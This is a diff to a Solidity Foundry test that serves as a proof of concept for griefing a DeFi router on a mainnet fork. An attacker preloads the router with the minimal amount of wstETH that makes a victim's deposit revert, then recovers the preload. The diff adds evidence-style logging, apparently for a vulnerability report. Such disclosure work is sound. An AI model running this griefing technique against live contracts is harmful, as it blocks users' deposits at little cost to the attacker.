@@ -98,11 +98,11 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
         vm.deal(address(victim), securityDeposit);
         vm.deal(ATTACKER, 1 ether);
 
-        emit log_named_uint("fork block", block.number);
-        emit log_named_address("asset", address(asset));
-        emit log_named_address("sdex", address(sdex));
-        emit log_named_uint("security deposit", securityDeposit);
-        emit log_named_uint("exact SDEX budget", exactSdexBudget);
+        emit log_named_uint("EVIDENCE_fork_block", block.number);
+        emit log_named_address("EVIDENCE_asset", address(asset));
+        emit log_named_address("EVIDENCE_sdex", address(sdex));
+        emit log_named_uint("EVIDENCE_security_deposit", securityDeposit);
+        emit log_named_uint("EVIDENCE_exact_sdex_budget_wei", exactSdexBudget);
     }
 
     function _trial(uint256 preload) internal returns (bool success_) {
@@ -157,7 +157,8 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
 
     function test_minimalRecoverablePreloadRevertsOfficialRoute() public {
         uint256 minimalPreload = _findMinimalRevertingPreload();
-        emit log_named_uint("minimal reverting preload wei wstETH", minimalPreload);
+        emit log_named_uint("EVIDENCE_minimal_reverting_preload_wei_wstETH", minimalPreload);
+        emit log_named_uint("EVIDENCE_threshold_minus_one_wei_wstETH", minimalPreload - 1);
 
         deal(address(asset), ATTACKER, minimalPreload);
         vm.prank(ATTACKER);
@@ -167,11 +168,12 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
         uint256 victimAssetBefore = asset.balanceOf(address(victim));
         uint256 victimSdexBefore = sdex.balanceOf(address(victim));
         uint256 gasBefore = gasleft();
-        (bool ok,) = address(victim).call(
+        (bool ok, bytes memory revertData) = address(victim).call(
             abi.encodeCall(VictimDepositWorkflow.run, (INTENDED_DEPOSIT, exactSdexBudget, securityDeposit))
         );
         uint256 victimCallGas = gasBefore - gasleft();
-        emit log_named_uint("reverted victim call gas", victimCallGas);
+        emit log_named_uint("EVIDENCE_reverted_victim_call_gas", victimCallGas);
+        emit log_named_bytes("EVIDENCE_revert_data", revertData);
         assertFalse(ok, "victim route must revert at minimal preload");
 
         assertEq(asset.balanceOf(address(victim)), victimAssetBefore, "victim asset transfer reverted");
@@ -187,5 +189,7 @@ contract TestRouterMainnetPreloadGriefPoC is Test {
 
         assertEq(asset.balanceOf(ATTACKER), minimalPreload, "attacker recovered full preload principal");
         assertEq(asset.balanceOf(ROUTER_ADDR), 0, "router preload recovered");
+        emit log_named_uint("EVIDENCE_attacker_recovered_preload_wei_wstETH", asset.balanceOf(ATTACKER));
+        emit log_named_uint("EVIDENCE_router_asset_balance_after_recovery", asset.balanceOf(ROUTER_ADDR));
     }
 }
